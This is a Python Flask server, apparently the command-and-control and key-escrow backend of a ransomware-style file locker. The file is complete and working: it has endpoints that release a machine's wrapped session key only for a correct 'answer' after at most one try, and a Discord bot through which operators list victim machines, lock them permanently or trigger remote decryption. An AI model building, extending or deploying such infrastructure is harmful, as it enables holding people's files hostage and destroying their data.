# serverv1.0.6.py
#!/usr/bin/env python3

import os
import re
import json
import time
import base64
import hashlib
import hmac
import secrets
import threading
from pathlib import Path

from flask import Flask, request, jsonify
from cryptography.hazmat.primitives.asymmetric.x25519 import (
    X25519PrivateKey, X25519PublicKey,
)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes

app = Flask(__name__)

app.config["MAX_CONTENT_LENGTH"] = 64 * 1024

MASTER_KEY_B64 = os.environ.get("MASTER_KEY_B64", "")
GOOD_ANSWER = os.environ.get("GOOD_ANSWER", "2")
MAX_ATTEMPTS = int(os.environ.get("MAX_ATTEMPTS", "1"))
STATE_FILE = Path(os.environ.get("STATE_FILE", "/tmp/fcrypt_state.json"))
TS_WINDOW = 300
ENVELOPE_MAX = 16384
HEARTBEAT_TTL = int(os.environ.get("HEARTBEAT_TTL", "90"))
RECOVERY_TTL = int(os.environ.get("RECOVERY_TTL", "3600"))
DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN", "")
DISCORD_ADMIN_IDS = {s.strip() for s in os.environ.get("DISCORD_ADMIN_IDS", "").split(",") if s.strip()}

if not MASTER_KEY_B64:
    raise RuntimeError("MASTER_KEY_B64 manquant")

try:
    _raw = base64.b64decode(MASTER_KEY_B64)
    if len(_raw) != 32:
        raise ValueError("master.key doit faire 32 octets")
    MASTER_PRIV = X25519PrivateKey.from_private_bytes(_raw)
except Exception as e:
    raise RuntimeError(f"MASTER_KEY_B64 invalide: {e}")

_state_lock = threading.Lock()


def _load_state() -> dict:
    if STATE_FILE.exists():
        try:
            return json.loads(STATE_FILE.read_text())
        except Exception:
            pass
    return {}


def _save_state(state: dict):
    try:
        tmp = STATE_FILE.with_suffix(".tmp")
        tmp.write_text(json.dumps(state))
        tmp.replace(STATE_FILE)
    except Exception:
        pass


STATE = _load_state()


def _refresh_state():
    with _state_lock:
        fresh = _load_state()
        STATE.clear()
        STATE.update(fresh)


def _env_hash(envelope: str) -> str:
    return hashlib.sha256(envelope.encode("utf-8")).hexdigest()


def _attempts_of(machine_id: str, env_h: str) -> int:
    with _state_lock:
        m = STATE.get("m:" + machine_id, {}).get("attempts", 0)
        e = STATE.get("e:" + env_h, {}).get("attempts", 0)
        return max(m, e)


def _env_unlocked(env_h: str) -> bool:
    with _state_lock:
        return bool(STATE.get("e:" + env_h, {}).get("unlocked", False))


def _record_both(machine_id: str, env_h: str, ok: bool):
    with _state_lock:
        m = STATE.setdefault("m:" + machine_id,
                             {"attempts": 0, "first_seen": time.time()})
        m["attempts"] += 1
        m["last_attempt"] = time.time()
        m["success"] = bool(ok)
        m.setdefault("envs", {})[env_h] = time.time()
        if ok:
            m["unlocked"] = True
        e = STATE.setdefault("e:" + env_h,
                             {"attempts": 0, "first_seen": time.time()})
        e["attempts"] += 1
        e["last_attempt"] = time.time()
        e["success"] = bool(ok)
        e.setdefault("machines", {})[machine_id] = time.time()
        if ok:
            e["unlocked"] = True
        _save_state(STATE)


def _is_locked(machine_id: str, env_h: str) -> bool:
    with _state_lock:
        if STATE.get("m:" + machine_id, {}).get("locked"):
            return True
        if STATE.get("e:" + env_h, {}).get("locked"):
            return True
        return False


def _env_attempts(env_h: str) -> int:
    with _state_lock:
        return STATE.get("e:" + env_h, {}).get("attempts", 0)


def _machine_failed(machine_id: str) -> bool:
    with _state_lock:
        m = STATE.get("m:" + machine_id, {})
        return bool(m.get("attempts", 0) > 0 and m.get("success") is False)


def _touch_machine(machine_id: str):
    with _state_lock:
        if STATE.get("m:" + machine_id) is None:
            STATE["m:" + machine_id] = {"attempts": 0, "first_seen": time.time(), "envs": {}}
            _save_state(STATE)


def _lock_machine(machine_id: str) -> int:
    with _state_lock:
        m = STATE.get("m:" + machine_id)
        if m is None:
            STATE["m:" + machine_id] = {
                "attempts": 0,
                "first_seen": time.time(),
                "locked": True,
                "locked_ts": time.time(),
                "envs": {},
            }
            _save_state(STATE)
            return 0
        m["locked"] = True
        m["locked_ts"] = time.time()
        n = 0
        for env_h in list(m.get("envs", {}).keys()):
            e = STATE.get("e:" + env_h)
            if e is None:
                continue
            e["locked"] = True
            e["locked_ts"] = time.time()
            n += 1
        _save_state(STATE)
        return n


def _client_ip() -> str:
    xff = request.headers.get("X-Forwarded-For", "")
    return xff.split(",")[0].strip() if xff else (request.remote_addr or "?")


def _parse_envelope(envelope_b64: str):
    raw = base64.b64decode(envelope_b64, validate=True)
    if len(raw) < 16 + 32 + 12 + 16:
        raise ValueError("enveloppe trop courte")
    if len(raw) > ENVELOPE_MAX:
        raise ValueError("enveloppe trop grande")
    off = 0
    salt = raw[off:off + 16]; off += 16
    eph_pub_raw = raw[off:off + 32]; off += 32
    nonce = raw[off:off + 12]; off += 12
    ct = raw[off:]
    eph_pub = X25519PublicKey.from_public_bytes(eph_pub_raw)
    return eph_pub, salt, nonce, ct


def _request_key(shared: bytes, salt: bytes) -> bytes:
    return HKDF(algorithm=hashes.SHA256(), length=32, salt=salt,
                info=b"request").derive(shared)


def _verify_mac(shared: bytes, salt: bytes, machine_id: str, answer: str,
                nonce: str, ts: str, envelope: str, mac: str) -> bool:
    key = _request_key(shared, salt)
    msg = "\n".join([machine_id, answer, nonce, ts, envelope]).encode("utf-8")
    good = hmac.new(key, msg, hashlib.sha256).hexdigest()
    return hmac.compare_digest(good, mac)


def _open_envelope(shared: bytes, salt: bytes, nonce: bytes, ct: bytes) -> bytes:
    key = HKDF(algorithm=hashes.SHA256(), length=32, salt=salt,
               info=b"envelope").derive(shared)
    session_key = AESGCM(key).decrypt(nonce, ct, salt)
    if len(session_key) != 32:
        raise ValueError("session_key invalide")
    return session_key


def _encrypt_response(session_key: bytes, shared: bytes, salt: bytes):
    key = HKDF(algorithm=hashes.SHA256(), length=32, salt=salt,
               info=b"response").derive(shared)
    nonce = secrets.token_bytes(12)
    ct = AESGCM(key).encrypt(nonce, session_key, None)
    return ct.hex(), nonce.hex()


def _poll_mac(shared: bytes, salt: bytes, machine_id: str, nonce: str,
              ts: str, env_h: str) -> str:
    key = HKDF(algorithm=hashes.SHA256(), length=32, salt=salt,
               info=b"poll").derive(shared)
    msg = "\n".join([machine_id, nonce, ts, env_h]).encode("utf-8")
    return hmac.new(key, msg, hashlib.sha256).hexdigest()


def _seen_nonce(machine_id: str, nonce: str) -> bool:
    now = time.time()
    with _state_lock:
        k = "n:" + machine_id
        cache = {n: t for n, t in STATE.get(k, {}).items() if now - t <= TS_WINDOW}
        replay = nonce in cache
        cache[nonce] = now
        STATE[k] = cache
        _save_state(STATE)
        return replay


def _heartbeat_seen(machine_id: str):
    with _state_lock:
        STATE.setdefault("h:" + machine_id, {})['last_seen'] = time.time()
        _save_state(STATE)


def _arm_recovery(machine_id: str) -> bool:
    with _state_lock:
        if STATE.get("m:" + machine_id, {}).get("locked"):
            return False
        known = any((p + machine_id) in STATE for p in ("h:", "m:", "r:"))
        STATE["r:" + machine_id] = {"pending": True, "issued_ts": time.time()}
        _save_state(STATE)
    return known


def _take_recovery(machine_id: str):
    with _state_lock:
        if STATE.get("m:" + machine_id, {}).get("locked"):
            return None
        r = STATE.get("r:" + machine_id)
        if not r or not r.get("pending"):
            return None
        if time.time() - float(r.get("issued_ts", 0)) > RECOVERY_TTL:
            STATE.pop("r:" + machine_id, None)
            _save_state(STATE)
            return None
        r["pending"] = False
        r["granted_ts"] = time.time()
        _save_state(STATE)
        return r


def _human_delta(sec) -> str:
    """Durée humaine : s / min / h / j / sem / mois / an(s)."""
    sec = max(0, int(sec))
    if sec < 60:
        return f"{sec} s"
    if sec < 3600:
        m, s = divmod(sec, 60)
        return f"{m} min {s} s" if s else f"{m} min"
    if sec < 86400:
        h, r = divmod(sec, 3600)
        m = r // 60
        return f"{h} h {m} min" if m else f"{h} h"
    if sec < 604800:
        d, r = divmod(sec, 86400)
        h = r // 3600
        return f"{d} j {h} h" if h else f"{d} j"
    if sec < 2592000:
        w, r = divmod(sec, 604800)
        d = r // 86400
        return f"{w} sem {d} j" if d else f"{w} sem"
    if sec < 31536000:
        mo, r = divmod(sec, 2592000)
        d = r // 86400
        return f"{mo} mois {d} j" if d else f"{mo} mois"
    y, r = divmod(sec, 31536000)
    mo = r // 2592000
    return f"{y} an(s) {mo} mois" if mo else f"{y} an(s)"


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "service": "fcrypt-server", "version": "1.0.6"}), 200


@app.route("/", methods=["GET"])
def root():
    return jsonify({"status": "ok", "service": "fcrypt-server", "version": "1.0.6"}), 200


@app.errorhandler(404)
def _not_found(_e):
    return jsonify({"error": "not_found"}), 404


@app.errorhandler(405)
def _method_not_allowed(_e):
    return jsonify({"error": "method_not_allowed"}), 405


@app.errorhandler(413)
def _payload_too_large(_e):
    return jsonify({"error": "payload_too_large"}), 413


@app.errorhandler(500)
def _internal_error(_e):
    return jsonify({"error": "server_error"}), 500


@app.route("/unlock", methods=["POST"])
def unlock():
    ip = _client_ip()
    try:
        req = request.get_json(force=True, silent=True) or {}
    except Exception:
        return jsonify({"status": "error", "reason": "bad_json"}), 400

    machine_id = str(req.get("machine_id", "")).strip().lower()
    answer = str(req.get("answer", ""))
    envelope = str(req.get("envelope", "")).strip()
    nonce = str(req.get("nonce", "")).strip().lower()
    ts = str(req.get("ts", "")).strip()
    mac = str(req.get("mac", "")).strip().lower()

    if not machine_id or not answer or not envelope or not nonce or not ts or not mac:
        return jsonify({"status": "error", "reason": "missing_fields"}), 400
    if (len(answer) > 32
            or not re.fullmatch(r"[0-9a-f]{8,64}", machine_id)
            or not re.fullmatch(r"[0-9a-f]{32}", nonce)
            or not re.fullmatch(r"\d{1,16}", ts)
            or not re.fullmatch(r"[0-9a-f]{64}", mac)
            or len(envelope) > 22000):
        return jsonify({"status": "error", "reason": "bad_fields"}), 400

    env_h = _env_hash(envelope)

    _refresh_state()
    if _is_locked(machine_id, env_h) or _env_unlocked(env_h) \
            or _env_attempts(env_h) >= MAX_ATTEMPTS or _machine_failed(machine_id):
        _touch_machine(machine_id)
        app.logger.info("unlock locked_out ip=%s machine=%s env=%s locked=%s envatt=%s mfail=%s",
                        ip, machine_id[:8], env_h[:8], _is_locked(machine_id, env_h),
                        _env_attempts(env_h), _machine_failed(machine_id))
        return jsonify({"status": "locked_out"}), 403

    try:
        eph_pub, salt, nonce_env, ct = _parse_envelope(envelope)
        shared = MASTER_PRIV.exchange(eph_pub)
    except Exception as e:
        app.logger.warning("unlock bad_envelope ip=%s err=%s", ip, e)
        return jsonify({"status": "error", "reason": "bad_envelope"}), 400

    if not _verify_mac(shared, salt, machine_id, answer, nonce, ts, envelope, mac):
        app.logger.warning("unlock bad_mac ip=%s machine=%s env=%s",
                           ip, machine_id[:8], env_h[:8])
        return jsonify({"status": "error", "reason": "bad_mac"}), 403

    try:
        ts_int = int(ts)
    except ValueError:
        return jsonify({"status": "error", "reason": "bad_fields"}), 400
    if abs(time.time() - ts_int) > TS_WINDOW:
        app.logger.warning("unlock stale ip=%s machine=%s", ip, machine_id[:8])
        return jsonify({"status": "error", "reason": "stale_request"}), 403

    if not hmac.compare_digest(answer, GOOD_ANSWER):
        _record_both(machine_id, env_h, ok=False)
        app.logger.info("unlock wrong ip=%s machine=%s env=%s",
                        ip, machine_id[:8], env_h[:8])
        return jsonify({"status": "wrong"}), 403

    try:
        session_key = _open_envelope(shared, salt, nonce_env, ct)
    except Exception as e:
        _record_both(machine_id, env_h, ok=False)
        app.logger.warning("unlock gcm_fail ip=%s machine=%s err=%s",
                           ip, machine_id[:8], e)
        return jsonify({"status": "error", "reason": "bad_envelope"}), 400

    enc_hex, nonce_hex = _encrypt_response(session_key, shared, salt)

    session_key = b"\x00" * 32
    del session_key

    _record_both(machine_id, env_h, ok=True)
    app.logger.info("unlock OK ip=%s machine=%s env=%s", ip, machine_id[:8], env_h[:8])
    return jsonify({
        "status": "ok",
        "session_key_enc": enc_hex,
        "nonce": nonce_hex,
    }), 200


@app.route("/poll", methods=["POST"])
def poll():
    ip = _client_ip()
    try:
        req = request.get_json(force=True, silent=True) or {}
    except Exception:
        return jsonify({"status": "error", "reason": "bad_json"}), 400

    machine_id = str(req.get("machine_id", "")).strip().lower()
    envelope = str(req.get("envelope", "")).strip()
    nonce = str(req.get("nonce", "")).strip().lower()
    ts = str(req.get("ts", "")).strip()
    mac = str(req.get("mac", "")).strip().lower()

    if not machine_id or not envelope or not nonce or not ts or not mac:
        return jsonify({"status": "error", "reason": "missing_fields"}), 400
    if (not re.fullmatch(r"[0-9a-f]{8,64}", machine_id)
            or not re.fullmatch(r"[0-9a-f]{32}", nonce)
            or not re.fullmatch(r"\d{1,16}", ts)
            or not re.fullmatch(r"[0-9a-f]{64}", mac)
            or len(envelope) > 22000):
        return jsonify({"status": "error", "reason": "bad_fields"}), 400

    _refresh_state()
    env_h = _env_hash(envelope)
    try:
        eph_pub, salt, nonce_env, ct = _parse_envelope(envelope)
        shared = MASTER_PRIV.exchange(eph_pub)
    except Exception as e:
        app.logger.warning("poll bad_envelope ip=%s err=%s", ip, e)
        return jsonify({"status": "error", "reason": "bad_envelope"}), 400

    if not hmac.compare_digest(_poll_mac(shared, salt, machine_id, nonce, ts, env_h), mac):
        app.logger.warning("poll bad_mac ip=%s machine=%s", ip, machine_id[:8])
        return jsonify({"status": "error", "reason": "bad_mac"}), 403

    try:
        ts_int = int(ts)
    except ValueError:
        return jsonify({"status": "error", "reason": "bad_fields"}), 400
    if abs(time.time() - ts_int) > TS_WINDOW:
        app.logger.warning("poll stale ip=%s machine=%s", ip, machine_id[:8])
        return jsonify({"status": "error", "reason": "stale_request"}), 403
    if _seen_nonce(machine_id, nonce):
        app.logger.warning("poll replay ip=%s machine=%s", ip, machine_id[:8])
        return jsonify({"status": "error", "reason": "replay"}), 403

    _heartbeat_seen(machine_id)

    if _is_locked(machine_id, env_h):
        app.logger.info("poll locked, recovery blocked ip=%s machine=%s",
                        ip, machine_id[:8])
        return jsonify({"status": "ok", "locked": True}), 200

    rec = _take_recovery(machine_id)
    if rec is None:
        return jsonify({"status": "ok"}), 200

    try:
        session_key = _open_envelope(shared, salt, nonce_env, ct)
    except Exception as e:
        app.logger.warning("poll recovery gcm_fail ip=%s machine=%s err=%s",
                           ip, machine_id[:8], e)
        _arm_recovery(machine_id)
        return jsonify({"status": "error", "reason": "bad_envelope"}), 400

    enc_hex, nonce_hex = _encrypt_response(session_key, shared, salt)
    session_key = b"\x00" * 32
    del session_key
    app.logger.info("poll recovery GRANTED ip=%s machine=%s", ip, machine_id[:8])
    return jsonify({"status": "ok",
                    "recovery": {"session_key_enc": enc_hex, "nonce": nonce_hex}}), 200


_BOT_LOCK_FD = None
_BOT_STATE = {"alive": False, "connected": False, "user": None,
              "error": None, "started_at": 0}


def _try_acquire_bot_lock():
    global _BOT_LOCK_FD
    try:
        import fcntl
        fd = open("/tmp/fcrypt_bot.lock", "w")
        fcntl.flock(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        _BOT_LOCK_FD = fd
        return True
    except Exception:
        return False


def _discord_bot_main(token: str):
    _BOT_STATE["alive"] = True
    _BOT_STATE["started_at"] = time.time()
    import logging
    logging.basicConfig(
        level=logging.INFO,
        format="[%(asctime)s] [%(levelname)s] [%(name)s] %(message)s",
        datefmt="%H:%M:%S",
    )
    logging.getLogger("discord").setLevel(logging.DEBUG)
    logging.getLogger("discord.gateway").setLevel(logging.DEBUG)
    logging.getLogger("discord.http").setLevel(logging.INFO)
    try:
        import discord
        from discord.ext import commands
    except Exception as e:
        _BOT_STATE["error"] = f"discord.py indisponible ({e}) — pip install discord.py"
        print(f"[bot] {_BOT_STATE['error']}")
        return
    tok_safe = token[:8] + "…" + token[-4:] if len(token) > 12 else "(court?)"
    print(f"[bot] bot.run imminent — token={tok_safe} "
          f"python={__import__('sys').version.split()[0]} "
          f"discord.py={discord.__version__} "
          f"admin_ids={DISCORD_ADMIN_IDS}")
    import asyncio
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        print(f"[bot] event loop asyncio installée ({loop.__class__.__name__})")
    except Exception as e:
        print(f"[bot] WARN install loop asyncio échouée ({e}) — bot.run tente quand même")
    intents = discord.Intents.default()
    intents.message_content = True
    bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

    @bot.event
    async def on_connect():
        print(f"[bot] on_connect — WS gateway ouvert, IDENTIFY en cours")

    @bot.event
    async def on_ready():
        _BOT_STATE["connected"] = True
        _BOT_STATE["user"] = str(bot.user)
        _BOT_STATE["error"] = None
        print(f"[bot] connecté : {bot.user} (id={bot.user.id})")

    @bot.event
    async def on_disconnect():
        _BOT_STATE["connected"] = False
        print(f"[bot] on_disconnect — WS fermé (close code "
              f"{getattr(bot.ws, 'close_code', '?')})")

    @bot.event
    async def on_resumed():
        print(f"[bot] on_resumed — session RESUMED")

    @bot.event
    async def on_error(event_method, *args, **kwargs):
        import traceback
        tb = traceback.format_exc()
        _BOT_STATE["error"] = f"on_error({event_method}): {tb[-300:]}"
        print(f"[bot] on_error {event_method}\n{tb}")

    def _admin(ctx) -> bool:
        return str(ctx.author.id) in DISCORD_ADMIN_IDS

    def _embed(title, color, desc="", fields=None, footer=None):
        e = discord.Embed(title=title, description=desc, color=color)
        if fields:
            for name, value, inline in fields:
                e.add_field(name=name, value=value, inline=inline)
        if footer:
            e.set_footer(text=footer)
        return e

    COL_INFO = 0x3B82F6
    COL_OK = 0x22C55E
    COL_WARN = 0xF59E0B
    COL_LOCK = 0xEF4444
    COL_ERR = 0x6B7280

    @bot.command(name="help")
    async def _help_cmd(ctx):
        if not _admin(ctx):
            await ctx.send(embed=_embed("Accès refusé", COL_ERR))
            return
        await ctx.send(embed=_embed(
            "Commandes opérateur", COL_INFO,
            "Réservées aux IDs Discord autorisés (`DISCORD_ADMIN_IDS`).",
            fields=[
                ("!list", "Machines connues : ✅ en ligne / ❌ hors ligne, 🔒 si verrouillée.", False),
                ("!lock <id>", "Verrouille la machine.", False),
                ("!unlock <id>", "Réinitialise la machine (lève le verrou et reset les tentatives).", False),
                ("!recovery <id>", "Récupération d'urgence : déclenche le déchiffrement en % sur le PC.", False),
                ("!help", "Cette aide.", False),
            ],
            footer=f"fcrypt-server · demandé par {ctx.author}"))

    @bot.command(name="list")
    async def _list_cmd(ctx):
        if not _admin(ctx):
            await ctx.send(embed=_embed("Accès refusé", COL_ERR))
            return
        now = time.time()
        _refresh_state()
        with _state_lock:
            _mids = {k[2:] for k in STATE if k[:2] in ("h:", "m:")}
            for ek, ev in STATE.items():
                if ek[:2] == "e:" and isinstance(ev, dict):
                    for sub_mid in ev.get("machines", {}):
                        _mids.add(sub_mid)
            mids = sorted(_mids)
            snap = {k: dict(v) for k, v in STATE.items()
                    if k[:2] in ("h:", "m:", "r:") and isinstance(v, dict)}
        if not mids:
            await ctx.send(embed=_embed(
                "Aucune machine connue", COL_WARN,
                "Aucune enveloppe reçue à ce jour."))
            return
        online_n = 0
        locked_n = 0
        fields = []
        for mid in mids[:25]:
            m = snap.get("m:" + mid, {})
            hs = float(snap.get("h:" + mid, {}).get("last_seen", 0))
            online = bool(hs) and (now - hs) <= HEARTBEAT_TTL
            if online:
                online_n += 1
            locked = bool(m.get("locked"))
            if locked:
                locked_n += 1
            ago = "jamais vu" if not hs else f"vu il y a {_human_delta(now - hs)}"
            status = "✅ en ligne" if online else "❌ hors ligne"
            if locked:
                nenv = len(m.get("envs", {}))
                status += f" · 🔒 verrouillée ({nenv} env. gelée(s))"
            if snap.get("r:" + mid, {}).get("pending"):
                status += " · ⏳ recovery armé"
            fields.append((f"`{mid}`", f"{status}\n{ago}", False))
        await ctx.send(embed=_embed(
            f"Machines ({len(mids)})", COL_INFO,
            f"🟢 {online_n} en ligne · 🔒 {locked_n} verrouillée(s) · total {len(mids)}",
            fields=fields,
            footer=f"fcrypt-server · demandé par {ctx.author}"))

    @bot.command(name="lock")
    async def _lock_cmd(ctx, mid: str = ""):
        if not _admin(ctx):
            await ctx.send(embed=_embed("Accès refusé", COL_ERR))
            return
        mid = mid.strip().lower()
        if not re.fullmatch(r"[0-9a-f]{8,64}", mid):
            await ctx.send(embed=_embed(
                "Usage", COL_WARN,
                "`!lock <machine_id>` — verrouille la machine."))
            return
        n = _lock_machine(mid)
        note = ("" if n > 0 else
                " (0 enveloppe = aucun /unlock tenté avant le lock — le verrou "
                "machine reste TOTAL.)")
        await ctx.send(embed=_embed(
            f"Machine verrouillée — `{mid}`", COL_LOCK,
            f"{n} enveloppe(s) associée(s) gelée(s).{note}",
            fields=[
                ("/unlock", "Renvoie `locked_out`.", False),
                ("!recovery", "Désactivé.", False),
            ],
            footer=f"verrouillé par {ctx.author}"))

    @bot.command(name="unlock")
    async def _unlock_cmd(ctx, mid: str = ""):
        if not _admin(ctx):
            await ctx.send(embed=_embed("Accès refusé", COL_ERR))
            return
        mid = mid.strip().lower()
        if not re.fullmatch(r"[0-9a-f]{8,64}", mid):
            await ctx.send(embed=_embed(
                "Usage", COL_WARN,
                "`!unlock <machine_id>` — retire le verrou posé par `!lock`."))
            return

        _refresh_state()
        with _state_lock:
            known = any((p + mid) in STATE for p in ("h:", "m:", "r:"))
            if not known:
                for ek, ev in STATE.items():
                    if ek[:2] == "e:" and isinstance(ev, dict):
                        if mid in ev.get("machines", {}):
                            known = True
                            break
            if not known:
                await ctx.send(embed=_embed(
                    "Machine inconnue", COL_WARN,
                    f"`{mid}` n'est pas dans l'état serveur. Vérifie l'id avec `!list`."))
                return

            m = STATE.get("m:" + mid)
            was_locked = bool(m and m.get("locked"))
            reset_envs = 0

            if m is None:
                STATE["m:" + mid] = {
                    "attempts": 0, "first_seen": time.time(),
                    "success": False, "envs": {},
                }
                _save_state(STATE)
            else:
                m["locked"] = False
                m.pop("locked_ts", None)
                m["attempts"] = 0
                m["success"] = False
                for env_h in list(m.get("envs", {}).keys()):
                    e = STATE.get("e:" + env_h)
                    if e is not None:
                        e["locked"] = False
                        e.pop("locked_ts", None)
                        e["attempts"] = 0
                        e["success"] = False
                        e["unlocked"] = False
                        reset_envs += 1
                _save_state(STATE)

        await ctx.send(embed=_embed(
            f"Machine réinitialisée — `{mid}`", COL_OK,
            f"Verrou opérateur levé (était {'ACTIF' if was_locked else 'inactif'}), "
            f"compteur de tentatives remis à zéro ({reset_envs} enveloppe(s) associée(s)). "
            f"La machine peut à nouveau tenter un `/unlock`.",
            footer=f"réinitialisé par {ctx.author}"))

    @bot.command(name="recovery")
    async def _recovery_cmd(ctx, mid: str = ""):
        if not _admin(ctx):
            await ctx.send(embed=_embed("Accès refusé", COL_ERR))
            return
        mid = mid.strip().lower()
        if not re.fullmatch(r"[0-9a-f]{8,64}", mid):
            await ctx.send(embed=_embed(
                "Usage", COL_WARN,
                "`!recovery <machine_id>` — récupérez l'id avec `!list`."))
            return
        if STATE.get("m:" + mid, {}).get("locked"):
            await ctx.send(embed=_embed(
                f"Récupération refusée — `{mid}`", COL_LOCK,
                "Cette machine est verrouillée (`!lock`). Annulez d'abord le verrou."))
            return
        known = _arm_recovery(mid)
        if known:
            await ctx.send(embed=_embed(
                f"Récupération armée — `{mid}`", COL_OK,
                "Le déchiffrement démarrera au prochain poll du PC (≤ ~10 s).",
                footer=f"armé par {ctx.author}"))
        else:
            await ctx.send(embed=_embed(
                f"Récupération armée (machine inconnue) — `{mid}`", COL_WARN,
                "Machine inconnue du serveur — drapeau armé quand même."))

    import threading as _th
    def _hb():
        while _BOT_STATE["alive"]:
            _BOT_STATE["hb"] = int(time.time())
            print(f"[bot] heartbeat — alive={_BOT_STATE['alive']} "
                  f"connected={_BOT_STATE['connected']} "
                  f"user={_BOT_STATE['user']} "
                  f"close_code={getattr(bot.ws,'close_code',None) if bot.ws else 'no-ws'} "
                  f"err={_BOT_STATE['error']}")
            time.sleep(30)
    _th.Thread(target=_hb, daemon=True).start()

    try:
        print(f"[bot] appel bot.run(token)…")
        bot.run(token)
    except Exception as e:
        import traceback
        tb = traceback.format_exc()
        _BOT_STATE["connected"] = False
        _BOT_STATE["error"] = f"{type(e).__name__}: {e}"
        print(f"[bot] ERREUR bot.run : {type(e).__name__}: {e}\n{tb}")
    finally:
        _BOT_STATE["alive"] = False
        print("[bot] bot.run terminé (finally)")


if DISCORD_BOT_TOKEN and _try_acquire_bot_lock():
    threading.Thread(target=_discord_bot_main, args=(DISCORD_BOT_TOKEN,), daemon=True).start()
    print("[bot] thread Discord démarré (worker détenteur du verrou)")
elif DISCORD_BOT_TOKEN:
    print("[bot] token présent mais un autre worker a déjà le verrou — bot skipé ici")


@app.route("/botstatus")
def _botstatus():
    return jsonify({
        "bot_running_here": _BOT_STATE["alive"],
        "connected": _BOT_STATE["connected"],
        "user": _BOT_STATE["user"],
        "error": _BOT_STATE["error"],
        "uptime_s": int(time.time() - _BOT_STATE["started_at"]) if _BOT_STATE["alive"] else 0,
        "token_set": bool(DISCORD_BOT_TOKEN),
        "token_prefix": (DISCORD_BOT_TOKEN[:8] + "…") if len(DISCORD_BOT_TOKEN) > 8 else "(court?)",
        "lock_held": _BOT_LOCK_FD is not None,
        "last_heartbeat": _BOT_STATE.get("hb", 0),
        "python": __import__("sys").version.split()[0],
    }), 200


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
